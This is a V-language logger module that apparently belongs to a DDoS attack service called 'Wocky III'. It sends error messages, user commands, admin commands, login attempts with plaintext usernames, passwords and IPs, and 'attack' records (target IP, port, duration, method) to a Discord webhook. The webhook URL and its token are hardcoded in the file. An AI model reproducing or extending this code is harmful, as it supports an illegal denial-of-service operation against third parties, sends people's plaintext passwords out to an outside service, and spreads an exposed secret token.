// module logger
import net.http
import json

pub const (
	webhook  = 'https://discord.com/api/webhooks/948368886590484491/44rpDJXVHn49L7ejKJIa3YjLA4Qdwy1Mz0otKfuhTWDUTCq6BlOSsyBmSpUVUU5gLFyc'
	username = 'Wocky III'
	pfp      = 'https://i.redd.it/acapu2iwnst41.jpg'
)

pub fn send_error(error string) {
	http.post_json(webhook, json.encode({
		'username':   username + ' - ERROR'
		'content':    '```ansi
[0;31m[1;40m╔═════════╦═════════════════╗ 
║  error  ║ $error          ║ 
╚═════════╩═════════════════╝ ```'
		//'content':    '```ansi\n[1;31m[1;40mERROR:[4;32m[4;40m$error\n```'
		'avatar_url': pfp
	})) or {}
}

pub fn send_cmd_log(user string, command string) {
	http.post_json(webhook, json.encode({
		'username':   username + ' - COMMAND'
		'content':    '```ansi
[0;31m[1;40m╔═════════╦═════════════════╗ 
║   user  ║ $user           ║ 
╠═════════╬═════════════════╣  
║ command ║ $command        ║ 
╚═════════╩═════════════════╝ ```'
		//'content':    '```ansi\n[1;36m[1;40mAttempted Command Usage:\n[1;34m[1;40m USER: [4;33m[4;40m$user\n[1;34m[1;40m COMMAND: [4;33m[4;40m$command\n```'
		'avatar_url': pfp
	})) or {}
}

pub fn send_login_log(user string, pass string, ip string) {
	http.post_json(webhook, json.encode({
		'username':   username + ' - LOGIN'
		'content':    '```ansi
[0;31m[1;40m╔════════╦═════════════════╗ 
║  user  ║ $user           ║ 
╠════════╬═════════════════╣  
║  pass  ║ $pass           ║ 
╠════════╬═════════════════╣ 
║   ip   ║ $ip             ║ 
╚════════╩═════════════════╝ ```'
		//'content':    '```ansi\n[1;36m[1;40mAttempted Login:\n[1;34m[1;40m USER: [4;33m[4;40m$user\n[1;34m[1;40m PASS: [4;33m[4;40m$pass\n[1;34m[1;40m IP: [4;33m[4;40m$ip\n```'
		'avatar_url': pfp
	})) or {}
}

pub fn send_attack_log(user string, user_ip string, ip string, port string, duration int, method string) {
	http.post_json(webhook, json.encode({
		'username':   username + ' - ATTACK'
		'content':    '```ansi
[0;31m[1;40m╔════════╦═════════════════╗ 
║  user  ║ $user           ║ 
╠════════╬═════════════════╣  
║ userip ║ $user_ip           ║ 
╠════════╬═════════════════╣ 
║   ip   ║ $ip           ║ 
╠════════╬═════════════════╣ 
║  port  ║ $port           ║ 
╠════════╬═════════════════╣ 
║  time  ║ $duration           ║ 
╠════════╬═════════════════╣ 
║ method ║ $method           ║  
╚════════╩═════════════════╝ ```'
		//'content':    '```ansi\n[1;36m[1;40mAttack Sent:\n[1;34m[1;40m USER: [4;33m[4;40m$user\n[1;34m[1;40m USER IP: [4;33m[4;40m$user_ip\n[1;34m[1;40m IP: [4;33m[4;40m$ip\n[1;34m[1;40m PORT: [4;33m[4;40m$port\n[1;34m[1;40m DURATION: [4;33m[4;40m$duration\n[1;34m[1;40m METHOD: [4;33m[4;40m$method\n```'
		'avatar_url': pfp
	})) or {}
}

pub fn send_admin_log(user string, admin_command string) {
	http.post_json(webhook, json.encode({
		'username':   username + ' - ADMIN COMMAND'
		'content':    '```ansi
[0;31m[1;40m╔═════════╦═════════════════╗ 
║   user  ║ $user           ║ 
╠═════════╬═════════════════╣  
║ command ║ $admin_command        ║ 
╚═════════╩═════════════════╝ ```'
		//'content':    '```ansi\n[1;36m[1;40mAdmin Command Usage:\n[1;34m[1;40m USER: [4;33m[4;40m$user\n[1;34m[1;40m COMMAND: [4;33m[4;40m$admin_command\n```'
		'avatar_url': pfp
	})) or {}
}

fn main() {
	send_error('it failed lol')
	send_cmd_log('social', '.ddos ur mom')
	send_login_log('user here', 'pass here', '1.1.1.1')
	send_attack_log('user here', 'user ip here', 'target ip here', 'port', 300, 'method')
	send_admin_log('user here', 'admin command here lol.jpeg')
}
